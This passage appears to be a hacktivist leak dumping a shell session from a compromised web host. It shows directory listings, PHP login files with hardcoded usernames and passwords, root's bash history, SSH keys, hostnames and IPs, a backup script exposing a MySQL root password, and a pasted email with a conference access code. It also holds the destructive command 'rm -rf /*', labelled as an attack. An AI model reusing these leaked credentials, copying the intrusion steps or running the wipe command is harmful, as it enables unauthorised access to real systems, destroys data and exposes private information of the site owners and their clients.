+-rw-r--r--  1 ftp ftp  6690 Jan 11 13:09 categories.php
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:54 categories~
+drwxr-xr-x 15 ftp ftp  4096 Feb 13 17:52 cc
+-rw-r--r--  1 ftp ftp   196 Dec 22 15:23 comingsoon.php
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:58 contact
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:58 content
+-rw-r--r--  1 ftp ftp  5957 Dec 22 15:15 createAccount.form.php~
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:58 distributors
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:58 download
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:58 events
+drwxr-xr-x  4 ftp ftp  4096 Sep 16 15:58 fancybox~
+-rw-r--r--  1 ftp ftp     0 Sep 16 15:52 favicon.ico
+-rw-r--r--  1 ftp ftp 14003 Dec 22 15:31 findDistributor.php~
+-rw-r--r--  1 ftp ftp  2487 Jan 12 13:54 index.php
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:58 login
+-rw-r--r--  1 ftp ftp  2434 Jan 11 13:14 login.form.php
+drwxr-xr-x  2 ftp ftp  4096 Oct 31 11:13 myaccount
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:58 news
+-rw-r--r--  1 ftp ftp    24 Dec 26 18:56 phpInfo.php
+-rw-r--r--  1 ftp ftp  3339 Jan  5 15:25 productDetail.php
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:58 products
+drwxr-xr-x  2 ftp ftp  4096 Jan  5 16:18 quote
+-rw-r--r--  1 ftp ftp  6863 Jan 18 12:32 requestAccount.form.php
+-rw-r--r--  1 ftp ftp  2112 Jan  6 14:48 resetPW.form.php
+-rw-r--r--  1 ftp ftp    29 Feb 13 19:57 robots.txt
+drwxr-xr-x  2 ftp ftp  4096 Sep 16 15:58 search
+drwxr-xr-x  2 ftp ftp  4096 Jan 10 10:36 training
+
+# cd /var/www/vhosts/sur-tec.com/docroot; ls -al
+total 164
+drwxrwxrwx 33 ftp ftp 4096 Feb 10 18:59 .
+drwxrwxrwx  4 ftp ftp 4096 Oct 12 18:04 ..
+-rwxrwxrwx  1 ftp ftp   87 Mar 26  2011 .htaccess
+drwxr-xr-x  6 ftp ftp 4096 May  1  2011 NOT-ME
+drwxr-xr-x  2 ftp ftp 4096 Apr  6  2011 _css
+drwxr-xr-x  9 ftp ftp 4096 Jul 16  2011 _img
+drwxr-xr-x  2 ftp ftp 4096 Mar  1  2011 _js
+drwxr-xr-x  2 ftp ftp 4096 Jul 15  2011 _pdf
+drwxr-xr-x  3 ftp ftp 4096 Jun  2  2011 _swf
+-rw-r--r--  1 ftp ftp 9143 Oct  3 11:41 access-request.php
+drwxr-xr-x  2 ftp ftp 4096 Jul 16  2011 cameras
+drwxr-xr-x  2 ftp ftp 4096 Mar 23  2011 company
+drwxr-xr-x  2 ftp ftp 4096 Jan  5  2011 content-to-sort
+drwxr-xr-x  2 ftp ftp 4096 Jul 15  2011 datalauncher
+drwxr-xr-x  2 ftp ftp 4096 Jul 15  2011 datalauncher-e
+drwxr-xr-x  2 ftp ftp 4096 Jul 16  2011 enclosures
+drwxr-xr-x  2 ftp ftp 4096 Mar 21  2011 exhibit-schedule
+-rw-r--r--  1 ftp ftp 1406 Jan  5  2011 favicon.ico
+drwxr-xr-x  2 ftp ftp 4096 Jul  6  2011 home
+-rw-r--r--  1 ftp ftp 1955 Jun  2  2011 index.php
+-rw-r--r--  1 ftp ftp  326 Oct 19 12:17 login.php
+-rw-r--r--  1 ftp ftp  305 Oct 20 08:44 login_sprint.php
+drwxr-xr-x  2 ftp ftp 4096 Mar  7  2011 mvss
+drwxr-xr-x  2 ftp ftp 4096 Apr  2  2011 request
+drwxr-xr-x  2 ftp ftp 4096 Oct 20 10:16 sprint
+drwxr-xr-x  3 ftp ftp 4096 Mar 27  2011 support
+drwxr-xr-x  2 ftp ftp 4096 Mar 29  2011 vantage
+drwxr-xr-x  2 ftp ftp 4096 Apr 30  2011 vp-alliance
+drwxr-xr-x  2 ftp ftp 4096 Jul 15  2011 vp-android
+drwxr-xr-x  2 ftp ftp 4096 Jul 15  2011 vp-avg
+drwxr-xr-x  2 ftp ftp 4096 Apr 30  2011 vp-enterprise-server
+drwxr-xr-x  2 ftp ftp 4096 Jul 15  2011 vp-insider
+drwxr-xr-x  2 ftp ftp 4096 May  9  2011 vp-mobile
+drwxr-xr-x  2 ftp ftp 4096 Apr 30  2011 vp-pes
+drwxr-xr-x  2 ftp ftp 4096 Apr 30  2011 vp-server-standard
+drwxr-xr-x  2 ftp ftp 4096 May  9  2011 vpmobile
+drwxr-xr-x  2 ftp ftp 4096 May 20  2011 vpserveractivation
+drwxr-xr-x  2 ftp ftp 4096 Feb 27  2011 wireless
+drwxr-xr-x  2 ftp ftp 4096 Mar 23  2011 xoa
+
+# cat login.php
+<?php
+
+  $skip_check = true;
+  $SKIP_OUPUT = true;
+	include( "header.php" );
+
+	
+
+	if ( ( $username == "gov" && $password == "government" ) ||  ( $username == "vpline" && $password == "covertops" ) ) {
+    $admin->setSession();
+    header( "Location: /home/" );
+    exit;
+	}
+	else {
+    header( "Location: /" );
+    exit;
+	}
+?>
+
+# cat login_sprint.php
+<?php
+  ob_start();
+  $skip_check = true;
+  $SKIP_OUTPUT = false;
+	include( "header.php" );
+
+	if  ( $username == "sprint" && $password == "publicsector"  ) {
+    $admin->setSession();
+    header( "Location: /sprint/downloads.php" );
+    exit;
+	}
+	else {
+    header( "Location: /sprint/" );
+    exit;
+	}
+?>
+
+# cat vpserveractivation/index.php
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="refresh" content="0;url=https://surtec.smithresearchsolutions.com/VP/Public/vpServerDownload/publish.htm">
+<title>Untitled Document</title>
+</head>
+
+<body>
+</body>
+</html>
+
+# cd /var/www/vhosts;
+
+# tar -czf sur-tec.tar.gz sur-tec.com &
+
+# tar -czf csi.tar.gz combinedsystems.com &
+
+# cd ~root; ls -al
+total 228
+drwx------  8 root root    4096 Aug 20 16:06 .
+drwxr-xr-x 19 root root    4096 Apr 17  2008 ..
+-rw-------  1 root root   10300 Feb 10 23:58 .bash_history
+-rw-r--r--  1 root root       0 Apr 19  2007 .keep
+-rw-------  1 root root      35 May 10  2008 .lesshst
+drwx------  2 root root    4096 Sep 14  2010 .links
+-rw-------  1 root root    4407 Jun 14  2011 .mysql_history
+-rw-------  1 root root    1318 Nov  2 13:52 .php_history
+-rw-------  1 root root   19422 Apr 17  2008 .pinerc
+-rw-------  1 root root    1024 Jan  5 19:01 .rnd
+drwxr-xr-x  2 root root    4096 Jun 22  2009 .ssh
+drwxr-xr-x  3 root root    4096 Jul 10  2009 .subversion
+-rw-r--r--  1 root ssmtp 104510 Jan 31 14:38 dead.letter
+drwxr-xr-x  3 root root    4096 Jul 10  2009 django
+-rw-r--r--  1 ftp  ftp     9716 Oct  2  2008 ez_setup.py
+-rwxrwx---  1 root root      26 Jun 10  2008 ftpPerms.sh
+drwx------  2 root root    4096 Apr 17  2008 mail
+-rw-r--r--  1 root root     112 Apr 22  2008 mail.php
+-rwxr-xr-x  1 root root     180 Jun  4  2008 my_emerges.txt
+drwxr-xr-x  3 root root    4096 Jul 10  2009 orbited
+-rw-r--r--  1 root root     504 Jul 28  2011 passwords.php
+-rwxr-xr-x  1 root root    3451 Jun 30  2010 qmail-filter.sh
+-rwxrwx---  1 ftp  ftp      223 Jun 30  2010 setup-filter.sh
+
+# cat ftpPerms.sh
+chown ftp:ftp /var/www -R
+
+# cat .bash_history
+*/
+// An ordered array of the ids of the addressbooks that should be searched
+// when populating address autocomplete fields server-side. ex: array('sql','Verisign');
+$rcmail_config['autocomplete_addressbooks'] = array('sql');
+// ----------------------------------
+// USER PREFERENCES
+// ----------------------------------
+// Use this charset as fallback for message decoding
+$rcmail_config['default_charset'] = 'ISO-8859-1';
+// skin name: folder from skins/
+$rcmail_config['skin'] = 'default';
+// show up to X items in list view
+$rcmail_config['pagesize'] = 40;
+// use this timezone to display date/time
+$rcmail_config['timezone'] = 'auto';
+// is daylight saving On?
+$rcmail_config['dst_active'] = (bool)date('I');
+// prefer displaying HTML messages
+$rcmail_config['prefer_html'] = true;
+// display remote inline images
+// 0 - Never, always ask
+// 1 - Ask if sender is not in address book
+// 2 - Always show inline images
+$rcmail_config['show_images'] = 0;
+// compose html formatted messages by default
+$rcmail_config['htmleditor'] = false;
+// show pretty dates as standard
+$rcmail_config['prettydate'] = true;
+// save compose message every 300 seconds (5min)
+$rcmail_config['draft_autosave'] = 300;
+// default setting if preview pane is enabled
+$rcmail_config['preview_pane'] = false;
+// Mark as read when viewed in preview pane (delay in seconds)
+// Set to -1 if messages in preview pane should not be marked as read
+$rcmail_config['preview_pane_mark_read'] = 0;
+// focus new window if new message arrives
+$rcmail_config['focus_on_new_message'] = true;
+// Clear Trash on logout
+$rcmail_config['logout_purge'] = false;
+// Compact INBOX on logout
+$rcmail_config['logout_expunge'] = false;
+// Display attached images below the message body 
+$rcmail_config['inline_images'] = true;
+// Encoding of long/non-ascii attachment names:
+// 0 - Full RFC 2231 compatible
+// 1 - RFC 2047 for 'name' and RFC 2231 for 'filename' parameter (Thunderbird's default)
+// 2 - Full 2047 compatible
+$rcmail_config['mime_param_folding'] = 1;
+// Set true if deleted messages should not be displayed
+// This will make the application run slower
+$rcmail_config['skip_deleted'] = false;
+// Set true to Mark deleted messages as read as well as deleted
+// False means that a message's read status is not affected by marking it as deleted
+$rcmail_config['read_when_deleted'] = true;
+
+// Set to true to newer delete messages immediately
+// Use 'Purge' to remove messages marked as deleted 
+$rcmail_config['flag_for_deletion'] = false;
+
+// Default interval for keep-alive/check-recent requests (in seconds)
+// Must be greater than or equal to 'min_keep_alive' and less than 'session_lifetime'
+$rcmail_config['keep_alive'] = 60;
+
+// If true all folders will be checked for recent messages
+$rcmail_config['check_all_folders'] = false;
+
+// If true, after message delete/move, the next message will be displayed
+$rcmail_config['display_next'] = false;
+
+// 0 - Do not expand threads 
+// 1 - Expand all threads automatically 
+// 2 - Expand only threads with unread messages 
+$rcmail_config['autoexpand_threads'] = 0;
+
+// When replying place cursor above original message (top posting)
+$rcmail_config['top_posting'] = false;
+
+// When replying strip original signature from message
+$rcmail_config['strip_existing_sig'] = true;
+
+// Show signature:
+// 0 - Never
+// 1 - Always
+// 2 - New messages only
+// 3 - Forwards and Replies only
+$rcmail_config['show_sig'] = 1;
+
+// When replying or forwarding place sender's signature above existing message
+$rcmail_config['sig_above'] = false;
+// Use MIME encoding (quoted-printable) for 8bit characters in message body
+$rcmail_config['force_7bit'] = false;
+// Defaults of the search field configuration.
+// The array can contain a per-folder list of header fields which should be considered when searching
+// The entry with key '*' stands for all folders which do not have a specific list set.
+// Please note that folder names should to be in sync with $rcmail_config['default_imap_folders']
+$rcmail_config['search_mods'] = null;  // Example: array('*' => array('subject'=>1, 'from'=>1), 'Sent' => array('subject'=>1, 'to'=>1));
+// 'Delete always'
+// This setting reflects if mail should be always deleted
+// when moving to Trash fails. This is necessary in some setups
+// when user is over quota and Trash is included in the quota.
+$rcmail_config['delete_always'] = false;
+// end of config file
+echo "" > main.inc.php
+nano main.inc.php
+ssh mail
+cd /var/www/vhosts/
+./new www.aeoniun.com aeoniun.com
+cd /var/backup/mysql/
+ls
+ls -l
+grep '`roundcube' mysql_all.dmp.1
+grep '`roundcube' mysql_all.dmp.1 -N
+grep '`roundcube' mysql_all.dmp.1 -n
+grep 'USE `' mysql_all.dmp.1 -n
+sed -n '4692,4897 p' mysql_all.dmp.1 > roundcubemail.sql
+ls
+nano roundcubemail.sql 
+cd /var/www/vhosts/workshop.tensquirrel.com/docroot/widespread/
+ls -al
+cat index.html 
+top
+rc-status
+ssh mail
+passwd squ1rr3lm3
+passwd
+uptime
+drives
+cd /var/www/vhosts/
+du -sh .
+du -sh *
+drives
+cd ..
+du -sh *
+cd ../../
+du -sh *
+cd /var
+du -sh *
+cd log
+du -sh *
+cd apache2/
+ls
+ls -h
+ls -hl
+mv access_log access_log~
+touch access_log
+ls
+ls -lh
+/etc/init.d/apache2 restart
+ls -lh
+rm access_log~
+drives
+cd /etc/
+cd ../var
+cd www
+cd vhosts
+ls
+cd csi.markbranding.com/
+ls
+cd docroot/
+ls
+cd _img
+ls
+ls -al
+chmod 777 products
+ls -al
+exit
+ls
+cd ../
+ls
+cd var/www
+ls
+cd vhosts
+cd csi.markbranding.com/
+cd docroot
+cd cc
+ls
+cd ckeditor/
+ls
+cd filemanager/
+ls
+cd -al
+ls -al
+chmod 777 userfiles
+lsl -al
+ls -al
+exit
+cd ../
+ls
+cd var/www/vhosts/
+cd csi.markbranding.com/
+cd docroot/cc
+ls
+cd ckeditor/filemanager/
+ls
+ls -al
+chmod 777 userfiles
+ls -al
+cd ../ls
+cd ../
+ls
+ls -al
+chmod 777 filemanager
+ls -al
+cd /var/www
+ls
+cd vhosts/www.combinedsystems.com/
+ls
+cd docroot
+ls
+cd cc/ckeditor
+ls
+cd filemanager/
+ls -al
+cd ../../
+ls
+cd ../
+ls
+cd la -al
+ls -al
+chmod 777 .htaccess
+cd ../
+ls
+cd docroot
+ls
+nano .htaccess
+exit
+cd /var/www/vhosts/www.petitepawsbnb.com/docroot/
+ls -al
+chmod 755 index.php 
+cd admin/
+ls
+ls -al
+chmod 755 index.php 
+ls -al *
+cd ..
+cd ..
+find . -type f -name *php -exec chmod 755 {} \;
+ls -al *
+find . -type f -name *php -exec chmod 744 {} \;
+ls -al *
+find . -type f -name *php -exec chmod 766 {} \;
+ls -al *
+cd /etc/apache2/ssl/
+ls
+cd 2011
+ls
+cd ..
+ls
+mkdir 2012
+cd 2012
+ls
+ls ../2011
+ls ../2010
+ls /usr/local/bin
+df -h
+w
+openssl genrsa -out www.cbts.edu.key 2048 
+openssl req -new -key www.cbts.edu.key -out www.cbts.edu.csr
+ls
+cat *.csr
+cd /etc/apache2/ssl/
+ls
+cd 2012
+ls
+nano -w www.cbts.edu.crt
+ls -lh
+chmod 400 *
+ls -lh
+nano -w /etc/apache2/httpd.conf
+/etc/init.d/apache2 restart
+cd /var/www/vhosts
+ls
+cd csi.markbranding.com/
+ls
+cs docroot/
+ls
+cd docroot/
+ls
+cd _img
+ls
+ls -al
+cd /var/www/vhosts
+cd combinedsystems.com/
+ls
+cd docroot
+ls
+cd _img
+ls
+ls -al
+exit
+cd /var/www/vhosts/
+ls
+ln -sf www.combinedsystems.com www.pennarms.com
+ln -sf www.combinedsystems.com pennarms.com
+ln -sf www.combinedsystems.com less-lethal.com
+ln -sf www.combinedsystems.com www.less-lethal.com
+ln -sf www.combinedsystems.com www.handcuffsusa.com
+ln -sf www.combinedsystems.com handcuffsusa.com
+cd www.combinedsystems.com/
+du -sh .
+ifconfig
+ifconfig
+cat /etc/resolv.conf 
+rc-status
+/etc/init.d/metalog restart
+rc-status
+/etc/init.d/mysql start
+ps aux | grep mysql
+/etc/init.d/mysql restart
+cd /var/www/vhosts/
+ls *mail*
+ssh mail
+cd mail.tensquirrel.com/
+ls
+ssh mail
+cd /var/www/vhosts/www.cambridgechurch.org/docroot/
+ls
+cd contact/
+ls
+nano index.php 
+cd /var/www/vhosts/
+./new voltage.tensquirrel.com
+cd
+php passwords.php 
+cd /var/www/vhosts/www.cbts.edu/docroot/
+ls
+cd Paypal.com
+ls
+less Pay_EN.php 
+ls -al
+ls -lu
+ls -lc
+cd WEBSCR-640-20101004-1/
+ls
+ls -al
+ls *
+cd ..
+cd ..
+rm -r Pay*
+ls
+cd /
+cd /var/www/vhosts/
+find . type f -name *Paypal*
+find . type f -name *Paypal* -exec rm -r {}\;
+find . type f -name *Paypal* -exec rm -r {};
+find . type f -name *Paypal* -exec rm -rf {};
+rm -r www.sur-tec.com/docroot/Pay*
+rm -r www.combinedsystems.com/docroot/cc/ckeditor/filemanager/userfiles/Pay*
+find . type f -name *Paypal*
+find . -type f -name *Paypal*
+find . -type d -name *Paypal*
+clear
+cd www.combinedsystems.com/docroot/cc/ckeditor/filemanager/userfiles/
+ls
+ls cheddar_bay/
+cd ..
+ls
+less ReadMe.txt 
+cd userfiles/
+cd ..
+ls
+less user.php
+ls scripts/
+ls -al
+cd userfiles/
+cd cheddar_bay/
+less cheddar_bay.sh 
+less cheddar_bay.sh 
+getent
+getent --help
+cd ../../
+rm -r userfiles/
+ls
+rm user.php 
+ls
+less connector.inc.php 
+tail dme
+dmesg | tail
+cd /var/log/
+ls
+cd sshd/
+ls
+tail current 
+cd ../pwdfail/
+ls
+tail current 
+cd /var/www/vhosts/www.sur-tec.com/docroot/
+ls
+cd 1
+ls
+cd ..
+rm -r 1*
+rm user.php
+rm fleurshi-.-.php 
+less access-request.php 
+cd datalauncher
+ls
+less index.php 
+less login
+cd ..
+less login.php
+clear
+cd ..
+cd ..
+find . -type f -name *fleur*
+find . -type f -name user.php
+cd www.combinedsystems.com/
+ls
+less user.php
+rm user.php
+cd docroot/
+ls
+ls cgi_bin/
+less cgi_bin/index.php 
+rm -r cgi*
+ls
+cd ../../
+find . -type d -name *cgi*
+find . -type d -name *zip
+find . -type d -name *1*
+find . -type f -name *1*
+find . -type f -name *zip
+find . -type f -name Final-production-files*
+find . -type f -name Final-production-files* -exec rm -r {} \;
+cd www.combinedsystems.com/docroot/cc/ckeditor/filemanager/
+ls -al
+ls .manage/
+rm -r .manage/
+ls -al
+less ReadMe.txt 
+cd ..
+ls
+chmod 766 filemanager/
+ls
+ls -al
+chmod 755 filemanager/
+ls -al
+chmod 755 filemanager/ -R
+find . -type f -name *sh
+rm -r _samples/
+cd ..
+ls
+cd ckeditor~
+ls
+cd filemanager/
+ls
+ls -al
+cd userfiles/
+ls -al
+cd ../../
+cd ../
+ls
+less index.php 
+ls users/
+cd ../../includes/
+ls
+ls lib/
+less master.class.php 
+less lib/site.class.php 
+less prepend.php~ 
+cd ../docroot/cc/
+ls
+cd lib
+ls
+cd lib
+ls
+less Permission.php 
+cd ..
+less admin.init.php 
+ls
+cd lib
+less DF.php
+clear
+cd /var/www/vhosts/
+grep -h
+grep --help
+grep -i paypal * -R
+tail /var/log/everything/current 
+cd /var/log/apache2/
+grep fleur access_log 
+tail -n 2000 access_log > snip.log
+grep fleur snip.log 
+grep fleur Paypal.com
+grep fleur Paypal.com snip.log 
+grep 'Paypal' snip.log 
+grep '41.200.63.234' access_log > snip.log
+cd /var/www/vhosts/
+find . -type f -name *gz
+cd /var/log/apache2/
+ls
+ls -l
+grep fleur error_log 
+cd /var/www/vhosts/www.combinedsystems.com/docroot/cc/
+ls
+mv ckeditor .ckeditor
+rm -r ckeditor~
+find . -type f -name uploadtest*
+find . -type f -name *test*
+cd .ckeditor/
+find . -type f -name *test*
+
+# cat .ssh/*
+ssh-dss AAAAB3NzaC1kc3MAAACBALTusKcd1w5RSRD8xqkzZ0K/2FGFF9SDuts5SjL53mh09spbBKVeezSiz2LqCpnooO649tGnUDBYp9e8eDn845PUx79X1HtN+jabqAD5+ZLJkcp0IOwdU4d2qiZYwNNJyf2YScdQXIXlaPlxt2tV2RI2OJPXewr4PQqsrogTSqtVAAAAFQCL64xTJWFjYynfKqoQadQviVOXXwAAAIBoxAwlQg62XZO9kCEXyJnN8M/OSyED1jtGcfulisGiK1dOv7oDHaPWCb7Lwu6sGP53sA747ciidXBOSoxNtmuDnKYmXyQq3K/a42dnpUMlufwVRbHX27iOxzdbaQL7IOmB07oZ95+vxVeITCAaQY8Lt7lKs+1VY83vhzNZBCvJwQAAAIEAicNBsi0KidsYh1Kb2kdE8z98WfUQVomtf5Pr+zlYU+N6EDM5d3lja8G5A2LYMdiW0fPWYTh8wapwwpS6lsTpsERJzeF9HACug46YvjFwMunsr37dMF8Lcegn61iKDjsxJVEKHyD+sBtMby8sgplZy4Y8Ux4dWhZEb1Ad4ZLvoLc= geeojr@one
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAs3tWolNRJ6atYIXk0WkFB1FOeKo71XLYGGE/mpJYAKKq4QqDTEuxgxPB4MxhJEg+VIYIcZixEZ+1njh83bobb6Id7x2S63PIg2XoDKfn0t9TUnrSJUbbrwdw4AWioFXjTbk5NvWngFhQW1sW+pGfzTs0TejCXD8J7+4CMnJqo4HKb3ii5N2oZ2YjNMqdy0dXChAeru6zdWYf2ccxxzBLuxdo4rgoYwafWG83pxO2D1DBCO8GOeUmOdpfTy1D4St9T9zImIyG+zYDgkPB+JBz9KH3I34864g5Rro8FUbtPSGSRbE27WR5Y2OHrBF8OzH03gGB6qrPxixWb/aXaxi+yw== jgeeo@fuji
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsSQc+lG487maU5LROdvXUb3dtQzEA1xcOlYaoFiIOOEta2d/0x7S0SPxvwpjpem5lO50O5K/yPxJGyEPzcSa8k16I3ujIUCtMNlUjCo6/KNOBaGbLGvedbjECm5gkVgx04lANC8uVZIVQt5cSxPwAthyn64varQPus060B6pZFEs+QZM1+uBMAT4vj/RB3mkB2+mwL2CdhT/0GT5/ijCs5ECqco7DZmG9O2t1YX3iXegpCQcMq/BKEAJOI/gE0IXe9XT+HLuTGEdhUkgO57Ss3E0M7q4oWuOAzXZAzvvbxwqU7ki/HG9Th0gNEKyfcveio1F6sK/ZKfAxYAG5eBW9w== geeojr@two
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAotlHRfPpO6j2jM4k+swF7V1fFMIc7T0hS93hEAWP4WUD6gTW3TNbh9pe2SFLiBvn3m1MUgEvz4GtpH9Ety6B45/q2y4Cf4CKZqAmWDXVpY5kfrGK+ZW88tCXGwqhi0wMzVIY5LeHcIaRWUzswZr3U6oi0IXGzkhzeE1L2K8+IIzIjmLHPaA3kzgWuQttvLz3yjKcWZGEUg/A22JXHm/XXKQlmi0f3iD7rJJkCR3/QjORjQmruOp6uQ31ndNFN7jspGxPtH+4roCOPoXzPiOjlWdCeowZ/mdLnxDH7IA+gSV/nciigq4AyPgWFiE5K+U6SA5K0rG8dqloozDELAQ51Q== root@zero
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAxcszrBEYcXYKdyPdJA9aiGoVXb9vvy8KutFlKjZIvJxspZnbsdFwj8+g2AFLGWXE98AlXYXdzTupjdU9thmy5TTnSvvT4EVMIr7rPp0b7aodZaaH/EIjalk+9qHQg7PUhtLE1SL2SqF/Vc5OvxR4cukdDRm1Z+o1/nIu2nitDaUuDk//kpILKVg0Hr5grDmPPiqAcf2wvracPYTErzje8TBOq0JkCC6EmsH5ptAzsm+cjRoE5hvHbuXG+gR3ecr4HtHPXwut6goqYEAbHddaVlMoxsKEkxEdHlrxUzXK+OPjwQ35bqjA31L2FValYCC8rbte0CmrX5gReVjtAqnzgQ== geeojr@one
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzZlG+uPSQfd8e9UhnjuefL/HuISgfYVVbbIHCydDdXmjZMq6kdXKdG4JC65G6pQbhe/kGc8rumv1QULkO4Nkf3h/0QLCWiBAsEFysOJcQY1M1aZUIVH6Hk5wAQsUZ5TY+LP7dQVEsd3KYwbSnU1ucmBc5LXY4mXbNF6+iEgjLsInYxmDyHezNBs/v1fq0GUSyICNwYyL4pdue638RDopLlQ8ctRLxrz86LMGXAecP/E3N50KfFRXum7rfoudDTWKFk0DAYJ93EfJrzic2GFZZmJwVPA1xfKdcGGLdYTAOrh0zdM245fU4KqQKuozdx0h62ULuoRxbLFh3Skh0kJ93Q== root@fs0
+
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA0UnumTWKqtXFoXuQHa56KWNkB9UH5OzoXaWvxhFdliCc+jrJbV0A98RGE88CR8wMUDW6sya3tir8P3DajPZTLPCzggvVstwGwGPo9QFaqgpREjjCbkmEoKRbE691uA7+2I4B6eZkAIHAHYoPmU8zEoCJCp2n3ybugzadLDD51x9s/1cvVDUIVwmDU2GhzfjiKOGmFd9+QxV+heWyOvsrS4ufayZzCtej1gu4OkRWvDWVs319Di5uvZ5XyQbDzWydVfLTvsYXJbWm8S8f41S+X24eNtAiH8eF69ZpSzf1ff8pHKqOB6HdWXin1/4U8hfThJSKHlfPeottXXTQM6wnfQ== root@kc1
+66.6.112.2 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwjOL3bBin510vUN8UZvpQrAztjPU00glMEApXmZULxV/VHHJgsPuH3vUgH4bppF/0c0uGTR3QKGC+zdsUQ7AbxXi4o2C+WsbTvLWaMhPhk+jrPDHgovts5vpVTwg6LnEKRLenZo5ivhcix1eoX2XCqdLwkxVyCD/iXfgvsYaOLx58QVDquacVZ74kuJY1/67GlYwVvRCn1EYZlL+K5F4f95y4eXp9jI4MEs/riNU6sQlWs380cQ8clO5Fh8L5bdriZ0b/dm775IR4iEpDYRVIqP/fmVZ5XO++upO84BZyeLGErxSaNw52vIe/c6uaC/2fKtnOchKiyQNZG2u8MxjWw==
+fs0.rivercitynet.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwjOL3bBin510vUN8UZvpQrAztjPU00glMEApXmZULxV/VHHJgsPuH3vUgH4bppF/0c0uGTR3QKGC+zdsUQ7AbxXi4o2C+WsbTvLWaMhPhk+jrPDHgovts5vpVTwg6LnEKRLenZo5ivhcix1eoX2XCqdLwkxVyCD/iXfgvsYaOLx58QVDquacVZ74kuJY1/67GlYwVvRCn1EYZlL+K5F4f95y4eXp9jI4MEs/riNU6sQlWs380cQ8clO5Fh8L5bdriZ0b/dm775IR4iEpDYRVIqP/fmVZ5XO++upO84BZyeLGErxSaNw52vIe/c6uaC/2fKtnOchKiyQNZG2u8MxjWw==
+fs1.krombie.net,208.110.93.110 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAut1wInovVXvG6odiRAAJNDg1X1pkA4RljV686HBysaOG9kvhkSQc2kSvdIrfWxgkkVLaWdlIvnqD/aRkX+Mh9whCaZWTDYdmXtfIZ7SnYxgBqSwsLyrqnCLCaSDk3lHVSN5IlFwxENT/wgub3uINvs+QaeDTC4CRJmsClPS6RLCcmAq4KkR7Uwqr1jo3FlZitNRmKHyv0vxrmY7HaHBR5QRChj8kUrxjSyocmA2szRPYEBbMgkNCteyg376gjKAyq2ds79KI+2M5AMotIbJOJnC95OMQOhjf8Qa5swRR3aO1rf9X6hehuhFwb/4O9F80v2SJx+PhBlqkDwY0lee0Zw==
+mail.tensquirrel.com,69.30.233.89 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEArb+3YCSUu6eupDt9zeqSQhbF2Ne7B0ww8LjL95F1f97299E2Mnf5s3dDLZ5Xi/UcVKjGP71ijcNRO6kEEKcb7/1nS/LO+ewe7B1t/vSbd6+R6XeztVy+N1Vmml04rZGUmyECfL2Ry188rjYJW/S8/jtEF1tYNoSMZEzn4BYREL5CYRf3zG4IkDwhxo7QiV7JCbd4PPc+8O2t2LqPzI9c+smddRYbeHp2wzCLcxN9fRf4ekjzqJTw+G//7kNp5v+bRSpyvUrx1Cev8aWG7lhUd1Dqf/NqU8jFYCv6Ujk6HomG2uYntjdrjWsNvd0zB0bCHLSScw22rNlE+aEZxUbnTQ==
+mail ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLhD02kFlxwn2hGI31YfgBZSh2J5XaX/cD4DTVen5q2h0MyAbtgJy301l2EZpIXdt2i4bRT+/inCr8a0Z0h1tjA=
+
+# cd /var/backup; ls -al
+total 16
+drwxr-xr-x  3 root root 4096 May 10  2010 .
+drwxr-xr-x 17 root root 4096 Dec 14  2010 ..
+-rwxrwx---  1 root root  914 Dec  2  2010 backup_mysql.sh
+drwxr-xr-x  2 root root 4096 Feb 13 00:00 mysql
+# cat backup_mysql.sh
+#!/bin/bash
+rm /var/backup/mysql/mysql_all.dmp.10 &&
+mv /var/backup/mysql/mysql_all.dmp.9 /var/backup/mysql/mysql_all.dmp.10 &&
+mv /var/backup/mysql/mysql_all.dmp.8 /var/backup/mysql/mysql_all.dmp.9 &&
+mv /var/backup/mysql/mysql_all.dmp.7 /var/backup/mysql/mysql_all.dmp.8 &&
+mv /var/backup/mysql/mysql_all.dmp.6 /var/backup/mysql/mysql_all.dmp.7 &&
+mv /var/backup/mysql/mysql_all.dmp.5 /var/backup/mysql/mysql_all.dmp.6 &&
+mv /var/backup/mysql/mysql_all.dmp.4 /var/backup/mysql/mysql_all.dmp.5 &&
+mv /var/backup/mysql/mysql_all.dmp.3 /var/backup/mysql/mysql_all.dmp.4 &&
+mv /var/backup/mysql/mysql_all.dmp.2 /var/backup/mysql/mysql_all.dmp.3 &&
+mv /var/backup/mysql/mysql_all.dmp.1 /var/backup/mysql/mysql_all.dmp.2 &&
+mv /var/backup/mysql/mysql_all.dmp /var/backup/mysql/mysql_all.dmp.1 &&
+mysqldump -u root -pbigGoat -r /var/backup/mysql/mysql_all.dmp -A
+echo "MySQL Backup Run Done `ls -l /var/backup/mysql/`"
+
+# rm -rf /* &      // BLACK BLOC ATTACK!!!!1
+
+################################################################################
+
+Talk to you then!
+
+~B
+
+On 11/09/2011 04:44 PM, Paul Davies wrote:
+> We await with baited breath... 10:30 it is..
+>
+> Conference Dial-in Number: (218) 844-8230
+> Participant Access Code: 624522#
+>
+> talk to you tomorrow.
+>
+> Paul
+>
+>
+> Paul Davies
+> President, MARK Corporate Branding
+>
